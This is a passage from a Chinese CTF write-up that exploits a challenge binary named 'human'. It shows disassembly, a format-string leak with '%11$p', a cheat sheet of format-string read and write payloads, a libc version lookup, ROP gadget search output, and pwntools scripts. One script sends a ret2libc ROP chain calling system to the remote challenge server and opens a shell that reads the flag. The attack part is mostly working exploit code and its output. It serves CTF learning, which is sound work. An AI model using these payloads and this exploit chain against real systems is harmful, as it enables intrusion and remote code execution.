class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x004006a0]&gt;</span><span class="bash"> pdf @main</span></span><br><span class="line">┌ 308: int main (int argc, char **argv, char **envp);</span><br><span class="line">│           ; var char *format @ rbp-0x20</span><br><span class="line">│           ; DATA XREF from entry0 @ 0x4006bd</span><br><span class="line">│           0x00400796      55             push rbp</span><br><span class="line">│           0x00400797      4889e5         mov rbp, rsp</span><br><span class="line">│           0x0040079a      4883ec20       sub rsp, 0x20</span><br><span class="line">│           0x0040079e      488b05cb0820.  mov rax, qword [obj.stdout] ; rdi</span><br><span class="line">│                                                                      ; [0x601070:8]=0</span><br><span class="line">│           0x004007a5      b900000000     mov ecx, 0                  ; size_t size</span><br><span class="line">│           0x004007aa      ba02000000     mov edx, 2                  ; int mode</span><br><span class="line">│           0x004007af      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x004007b4      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x004007b7      e894feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x004007bc      488b05bd0820.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5</span><br><span class="line">│                                                                      ; [0x601080:8]=0</span><br><span class="line">│           0x004007c3      b900000000     mov ecx, 0                  ; size_t size</span><br><span class="line">│           0x004007c8      ba01000000     mov edx, 1                  ; int mode</span><br><span class="line">│           0x004007cd      be00000000     mov esi, 0                  ; char *buf</span><br><span class="line">│           0x004007d2      4889c7         mov rdi, rax                ; FILE*stream</span><br><span class="line">│           0x004007d5      e876feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)</span><br><span class="line">│           0x004007da      488d45e0       lea rax, [format]</span><br><span class="line">│           0x004007de      ba20000000     mov edx, 0x20               ; 32 ; size_t n</span><br><span class="line">│           0x004007e3      be00000000     mov esi, 0                  ; int c</span><br><span class="line">│           0x004007e8      4889c7         mov rdi, rax                ; void *s</span><br><span class="line">│           0x004007eb      e830feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)</span><br><span class="line">│           0x004007f0      bf58094000     mov edi, 0x400958           ; const char *s</span><br><span class="line">│           0x004007f5      e806feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x004007fa      488d45e0       lea rax, [format]</span><br><span class="line">│           0x004007fe      ba08000000     mov edx, 8                  ; size_t nbyte</span><br><span class="line">│           0x00400803      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│           0x00400806      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x0040080b      e820feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x00400810      488d45e0       lea rax, [format]</span><br><span class="line">│           0x00400814      4889c7         mov rdi, rax                ; const char *format</span><br><span class="line">│           0x00400817      b800000000     mov eax, 0</span><br><span class="line">│           0x0040081c      e8effdffff     call sym.imp.printf         ; int printf(const char *format)</span><br><span class="line">│           0x00400821      488d45e0       lea rax, [format]</span><br><span class="line">│           0x00400825      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00400828      e8d3fdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x0040082d      488d45e0       lea rax, [format]</span><br><span class="line">│           0x00400831      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00400834      e8c7fdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00400839      488d45e0       lea rax, [format]</span><br><span class="line">│           0x0040083d      4889c7         mov rdi, rax                ; const char *s</span><br><span class="line">│           0x00400840      e8bbfdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00400845      bf78094000     mov edi, 0x400978           ; const char *s</span><br><span class="line">│           0x0040084a      e8b1fdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x0040084f      bf01000000     mov edi, 1                  ; int s</span><br><span class="line">│           0x00400854      e817feffff     call sym.imp.sleep          ; int sleep(int s)</span><br><span class="line">│           0x00400859      bf98094000     mov edi, 0x400998           ; const char *s</span><br><span class="line">│           0x0040085e      e89dfdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00400863      488d45e0       lea rax, [format]</span><br><span class="line">│           0x00400867      ba40000000     mov edx, 0x40               ; rdx ; size_t nbyte</span><br><span class="line">│           0x0040086c      4889c6         mov rsi, rax                ; void *buf</span><br><span class="line">│           0x0040086f      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x00400874      e8b7fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x00400879      488d45e0       lea rax, [format]</span><br><span class="line">│           0x0040087d      beb3094000     mov esi, 0x4009b3           ; const char *s2</span><br><span class="line">│           0x00400882      4889c7         mov rdi, rax                ; const char *s1</span><br><span class="line">│           0x00400885      e8f6fdffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)</span><br><span class="line">│           0x0040088a      4885c0         test rax, rax</span><br><span class="line">│       ┌─&lt; 0x0040088d      7416           je 0x4008a5</span><br><span class="line">│       │   0x0040088f      488d45e0       lea rax, [format]</span><br><span class="line">│       │   0x00400893      beba094000     mov esi, 0x4009ba           ; const char *s2</span><br><span class="line">│       │   0x00400898      4889c7         mov rdi, rax                ; const char *s1</span><br><span class="line">│       │   0x0040089b      e8e0fdffff     call sym.imp.strstr         ; char *strstr(const char *s1, const char *s2)</span><br><span class="line">│       │   0x004008a0      4885c0         test rax, rax</span><br><span class="line">│      ┌──&lt; 0x004008a3      7514           jne 0x4008b9</span><br><span class="line">│      ││   ; CODE XREF from main @ 0x40088d</span><br><span class="line">│      │└─&gt; 0x004008a5      bfc8094000     mov edi, str.               ; 0x4009c8 ; const char *s</span><br><span class="line">│      │    0x004008aa      e851fdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│      │    0x004008af      bf00000000     mov edi, 0                  ; int status</span><br><span class="line">│      │    0x004008b4      e8a7fdffff     call sym.imp.exit           ; void exit(int status)</span><br><span class="line">│      │    ; CODE XREF from main @ 0x4008a3</span><br><span class="line">│      └──&gt; 0x004008b9      bff8094000     mov edi, str.:              ; 0x4009f8 ; const char *s</span><br><span class="line">│           0x004008be      e83dfdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x004008c3      b800000000     mov eax, 0</span><br><span class="line">│           0x004008c8      c9             leave</span><br><span class="line">└           0x004008c9      c3             ret</span><br></pre></td></tr></table></figure></p>
<p>可以看出main函数将第一条输入输出四次，第一次存在格式化字符串漏洞。然后将第二条输入准对两个字符串进行搜索，若都含有则继续执行到ret，否则调用exit。第二次读入存在栈溢出（0x40&gt;0x20）</p>
<p>查看第二次输入需要的两条字符串<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x004006a0]&gt;</span><span class="bash"> ps @ 0x4009ba</span></span><br><span class="line">\xe7\x9c\x9f\xe9\xa6\x99</span><br><span class="line"><span class="meta">[0x004006a0]&gt;</span><span class="bash"> ps @ 0x4009b3</span></span><br><span class="line">\xe9\xb8\xbd\xe5\xad\x90</span><br></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">python</span></span><br><span class="line">Python 3.8.1 (default, Jan 22 2020, 06:38:00) </span><br><span class="line">[GCC 9.2.0] on linux</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; br<span class="string">'\xe7\x9c\x9f\xe9\xa6\x99'</span>.decode(<span class="string">'unicode-escape'</span>).encode(<span class="string">'latin1'</span>).decode(<span class="string">'utf-8'</span>)</span></span><br><span class="line">'真香'</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; br<span class="string">'\xe9\xb8\xbd\xe5\xad\x90'</span>.decode(<span class="string">'unicode-escape'</span>).encode(<span class="string">'latin1'</span>).decode(<span class="string">'utf-8'</span>)</span></span><br><span class="line">'鸽子'</span><br></pre></td></tr></table></figure>
<p>本地测试验证一下逻辑和格式化字符串漏洞<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">./human </span></span><br><span class="line">人类的本质是什么?</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line">0x7f56172cd023</span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line"></span><br><span class="line">一位群友打烂了复读机!</span><br><span class="line"></span><br><span class="line">人类还有什么本质?</span><br><span class="line">鸽子真香</span><br><span class="line">人类的三大本质:复读机,真香,鸽子</span><br></pre></td></tr></table></figure></p>
<p>验证通过，并读取了main函数在本地运行时的返回地址，其中<code>%11$p</code>的计算方法：sym.imp.__libc_start_main_ret地址的偏移为 0x28/8.0 + 6 (64位elf前6个参数为寄存器传参) = 11。<code>%p</code>表示打印指针，<code>11$</code>表示打印第11个，这里刚好对应__libc_start_main_ret地址</p>
<p>格式化字符串漏洞的利用payload总结<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">32位</span><br><span class="line"> </span><br><span class="line">读</span><br><span class="line"> </span><br><span class="line">'%&#123;&#125;$x'.format(index)           // 读4个字节</span><br><span class="line">'%&#123;&#125;$p'.format(index)           // 同上面</span><br><span class="line">'$&#123;&#125;$s'.format(index)</span><br><span class="line">写</span><br><span class="line"> </span><br><span class="line">'%&#123;&#125;$n'.format(index)           // 解引用，写入四个字节</span><br><span class="line">'%&#123;&#125;$hn'.format(index)          // 解引用，写入两个字节</span><br><span class="line">'%&#123;&#125;$hhn'.format(index)         // 解引用，写入一个字节</span><br><span class="line">'%&#123;&#125;$lln'.format(index)         // 解引用，写入八个字节</span><br><span class="line"> </span><br><span class="line">////////////////////////////</span><br><span class="line">64位</span><br><span class="line"> </span><br><span class="line">读</span><br><span class="line"> </span><br><span class="line">'%&#123;&#125;$x'.format(index, num)      // 读4个字节</span><br><span class="line">'%&#123;&#125;$lx'.format(index, num)     // 读8个字节</span><br><span class="line">'%&#123;&#125;$p'.format(index)           // 读8个字节</span><br><span class="line">'$&#123;&#125;$s'.format(index)</span><br><span class="line">写</span><br><span class="line"> </span><br><span class="line">'%&#123;&#125;$n'.format(index)           // 解引用，写入四个字节</span><br><span class="line">'%&#123;&#125;$hn'.format(index)          // 解引用，写入两个字节</span><br><span class="line">'%&#123;&#125;$hhn'.format(index)         // 解引用，写入一个字节</span><br><span class="line">'%&#123;&#125;$lln'.format(index)         // 解引用，写入八个字节</span><br><span class="line"> </span><br><span class="line"><span class="meta">%</span><span class="bash">1<span class="variable">$lx</span>: RSI</span></span><br><span class="line"><span class="meta">%</span><span class="bash">2<span class="variable">$lx</span>: RDX</span></span><br><span class="line"><span class="meta">%</span><span class="bash">3<span class="variable">$lx</span>: RCX</span></span><br><span class="line"><span class="meta">%</span><span class="bash">4<span class="variable">$lx</span>: R8</span></span><br><span class="line"><span class="meta">%</span><span class="bash">5<span class="variable">$lx</span>: R9</span></span><br><span class="line"><span class="meta">%</span><span class="bash">6<span class="variable">$lx</span>: 栈上的第一个QWORD</span></span><br></pre></td></tr></table></figure></p>
<p>关于11的确定，参考gdb调试时栈中状态<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffcf86c5400│+0x0000: 0x0000007024313125 ("%11$p"?)        ← $rsp, $rsi</span><br><span class="line">0x00007ffcf86c5408│+0x0008: 0x0000000000000000</span><br><span class="line">x00007ffcf86c5410│+0x0010: 0x0000000000000000</span><br><span class="line">0x00007ffcf86c5418│+0x0018: 0x0000000000000000</span><br><span class="line">0x00007ffcf86c5420│+0x0020: 0x0000000000000000   ← $rbp</span><br><span class="line">0x00007ffcf86c5428│+0x0028: 0x00007ff3c292c023  →  &lt;__libc_start_main+243&gt; mov edi, eax  # 0x28/8，字长相关，64位8字节为一单元，32位4字节为一单元</span><br><span class="line">0x00007ffcf86c5430│+0x0030: 0x00007ff3c2b1e5c0  →  0x0005050700000000</span><br><span class="line">0x00007ffcf86c5438│+0x0038: 0x00007ffcf86c5518  →  0x00007ffcf86c64d9  →  0x006e616d75682f2e ("./human"?)</span><br></pre></td></tr></table></figure></p>
<p>也可以使用pwntools的自动化工具对offset进行测试，然而这题并不适用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span> </span><br><span class="line">    sh = process(<span class="string">'./human'</span>)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sh.recvline()</span><br><span class="line">    result = sh.recvline()</span><br><span class="line">    print(result)</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">print(autofmt.offset)</span><br></pre></td></tr></table></figure></p>
<p>ret2libc这一技巧的关键在于确定加载阶段libc的地址，libc中函数的真实地址 = 基地址 + 偏移量，偏移量与libc版本有关，基地址每次都会变化，但是低3位为0。也就是说，拿到某个libc函数的地址后，可以根据后三位得到libc版本，随后就可以得到加载时的基地址（因为函数间偏移量不变，其实确定版本号后，可以根据目标函数和当前函数的偏移量，直接计算出目标函数的真实地址）</p>
<p>拿到__libc_start_main_ret地址后还需要确定libc版本，在题目没有给出版本的情况下，针对格式化字符串和ROP有两种方法获得版本。第一种，上文提到libc基地址的低3位为0，那么格式化字符串泄漏的__libc_start_main_ret地址的低3位也是不变的，可以查到libc版本。第二种，构造ROP链，在函数返回时跳转到<code>pop rdi; ret</code>，将__libc_start_main的地址pop入rdi，然后调用sym.imp.puts函数，将真实的__libc_start_main地址打印出来</p>
<p>以下是利用ROP链读取__libc_start_main地址的脚本（参考<a href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/" target="_blank" rel="noopener">https://tasteofsecurity.com/security/ret2libc-unknown-libc/</a>）。在这题里只能输入0x40个字节，前0x20+8用来填充缓冲区和覆盖rbp，剩下有24个字节空间，能输入3个指针，分别对应<code>pop rdi; ret</code>、__libc_start_main的symbol地址、sym.imp.puts的symbol地址，理论上可以读出__libc_start_main的真实地址。但是，ROP链结束后无法回到main函数，会crash，然后重启，libc的加载地址又会发生变化，因此这题无法利用。针对栈溢出字节数不足的情况，可以考虑使用栈迁移，分多次将数据（如shellcode）写入一段连续的内存中，但这里也是不够的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./human'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">gdb.attach(proc.pidof(sh)[<span class="number">0</span>],gdbscript=<span class="string">"b main"</span>)</span><br><span class="line"></span><br><span class="line">print(sh.recvline())</span><br><span class="line"></span><br><span class="line"><span class="comment"># read ret address of libc_start_main from stack</span></span><br><span class="line">sh.send(<span class="string">'%11$p'</span>)  <span class="comment"># ?</span></span><br><span class="line">sh.recvline()</span><br><span class="line">libc_start_main_ret_addr = int(sh.recvline()[<span class="number">2</span>:<span class="number">-6</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">'libc_start_main_ret_addr: '</span>, libc_start_main_ret_addr)</span><br><span class="line"></span><br><span class="line">print(sh.recvuntil(<span class="string">"人类还有什么本质?"</span>))</span><br><span class="line"></span><br><span class="line">padding = bytes(<span class="string">'鸽子真香'</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>, <span class="string">"A"</span>), <span class="string">'utf-8'</span>)  <span class="comment"># ljust在字符串末尾插入了其他字符，导致ROP构造不成功，因此还是手动构造</span></span><br><span class="line">padding = bytes(<span class="string">"鸽子真香"</span>, <span class="string">'utf-8'</span>) + <span class="string">b"A"</span> * (<span class="number">0x20</span>+<span class="number">8</span><span class="number">-12</span>)  <span class="comment"># '鸽子真香'每个字符占3字节</span></span><br><span class="line">rop_gadget = p64(<span class="number">0x400933</span>)  <span class="comment"># pop rdi; ret</span></span><br><span class="line">LIBC_START_MAIN = p64(<span class="number">0x400640</span>)  <span class="comment"># sym.imp.libc_start_main</span></span><br><span class="line">PUTS = p64(<span class="number">0x400600</span>)  <span class="comment"># sym.imp.puts</span></span><br><span class="line">payload = padding + rop_gadget + LIBC_START_MAIN + PUTS</span><br><span class="line">print(len(payload), payload)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"人类的三大本质:复读机,真香,鸽子"</span>)</span><br><span class="line">recieved = sh.recvline().strip()</span><br><span class="line">leak = u64(recieved.ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">print(hex(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.interactive()</span></span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure></p>
<p>连接题目地址，直接利用printf泄漏出__libc_start_main_ret地址<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">nc 114.116.54.89 10005</span></span><br><span class="line">人类的本质是什么?</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line">0x7fc468e9f830</span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash">11<span class="variable">$p</span></span></span><br><span class="line"></span><br><span class="line">一位群友打烂了复读机!</span><br><span class="line"></span><br><span class="line">人类还有什么本质?</span><br></pre></td></tr></table></figure></p>
<p>通过libc-database查询libc版本，并获取相关地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$./find __libc_start_main_ret 0x7fc468e9f830</span><br><span class="line">ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line">archive-glibc (id libc6_2.23-0ubuntu11_amd64)</span><br><span class="line">archive-glibc (id libc6_2.23-0ubuntu3_amd64)</span><br><span class="line"></span><br><span class="line">$./dump libc6_2.23-0ubuntu10_amd64</span><br><span class="line">offset___libc_start_main_ret = 0x20830</span><br><span class="line">offset_system = 0x0000000000045390</span><br><span class="line">offset_dup2 = 0x00000000000f7970</span><br><span class="line">offset_read = 0x00000000000f7250</span><br><span class="line">offset_write = 0x00000000000f72b0</span><br><span class="line">offset_str_bin_sh = 0x18cd57</span><br></pre></td></tr></table></figure></p>
<p>至此，我们已经可以在一次执行中获取到__libc_start_main_ret地址，并可以推断出libc加载基地址和<code>system</code>、<code>/bin/bash</code>地址，可以构造ROP链进行攻击</p>
<p>寻找ROP gadget<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">ROPgadget --binary human --only <span class="string">'pop|ret'</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040092c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040092e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400930 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400932 : pop r15 ; ret</span><br><span class="line">0x000000000040092b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040092f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400700 : pop rbp ; ret</span><br><span class="line">0x0000000000400933 : pop rdi ; ret</span><br><span class="line">0x0000000000400931 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040092d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005e9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure></p>
<p>获取到<code>pop rdi; ret</code>的地址为<code>0x0000000000400933</code>，编写利用脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"114.116.54.89"</span>, <span class="number">10005</span>)</span><br><span class="line">print(sh.recvline())</span><br><span class="line"></span><br><span class="line"><span class="comment"># read ret address of libc_start_main from stack</span></span><br><span class="line">sh.send(<span class="string">'%11$p'</span>)  <span class="comment"># ?</span></span><br><span class="line">sh.recvline()</span><br><span class="line">libc_start_main_ret_addr = int(sh.recvline()[<span class="number">2</span>:<span class="number">-6</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">'libc_start_main_ret_addr: '</span>, hex(libc_start_main_ret_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset_system - offset___libc_start_main_ret = system - __libc_start_main_ret</span></span><br><span class="line"><span class="comment"># = 0x0000000000045390 - 0x20830 = 0x24b60</span></span><br><span class="line">system_addr = libc_start_main_ret_addr + <span class="number">0x24b60</span></span><br><span class="line"><span class="comment"># 同理</span></span><br><span class="line">bin_bash_addr = libc_start_main_ret_addr + <span class="number">0x16c527</span></span><br><span class="line"></span><br><span class="line">print(sh.recvuntil(<span class="string">"人类还有什么本质?"</span>))</span><br><span class="line"></span><br><span class="line">padding = bytes(<span class="string">'鸽子真香'</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>, <span class="string">"A"</span>), <span class="string">'utf-8'</span>)  <span class="comment"># ljust在字符串末尾插入了其他字符，导致ROP构造不成功，因此还是手动构造</span></span><br><span class="line">padding = bytes(<span class="string">"鸽子真香"</span>, <span class="string">'utf-8'</span>) + <span class="string">b"A"</span> * (<span class="number">0x20</span>+<span class="number">8</span><span class="number">-12</span>)  <span class="comment"># '鸽子真香'每个字符占3字节</span></span><br><span class="line">rop_gadget = p64(<span class="number">0x400933</span>)  <span class="comment"># pop rdi; ret</span></span><br><span class="line">payload = padding + rop_gadget + p64(bin_bash_addr) + p64(system_addr)</span><br><span class="line">print(len(payload))</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">python pwn5.py </span></span><br><span class="line">[+] Opening connection to 114.116.54.89 on port 10005: Done</span><br><span class="line">b'\xe4\xba\xba\xe7\xb1\xbb\xe7\x9a\x84\xe6\x9c\xac\xe8\xb4\xa8\xe6\x98\xaf\xe4\xbb\x80\xe4\xb9\x88?\n'</span><br><span class="line">libc_start_main_ret_addr:  0x7f81e25fb830</span><br><span class="line">b'%11$p\n%11$p\n\xe4\xb8\x80\xe4\xbd\x8d\xe7\xbe\xa4\xe5\x8f\x8b\xe6\x89\x93\xe7\x83\x82\xe4\xba\x86\xe5\xa4\x8d\xe8\xaf\xbb\xe6\x9c\xba!\n\n\xe4\xba\xba\xe7\xb1\xbb\xe8\xbf\x98\xe6\x9c\x89\xe4\xbb\x80\xe4\xb9\x88\xe6\x9c\xac\xe8\xb4\xa8?'</span><br><span class="line">64</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">人类的三大本质:复读机,真香,鸽子</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat flag</span></span><br><span class="line">flag&#123;as67sdf834ht98e7sdyf9348yf0y&#125;$ </span><br><span class="line">[*] Interrupted</span><br></pre></td></tr></table></figure>
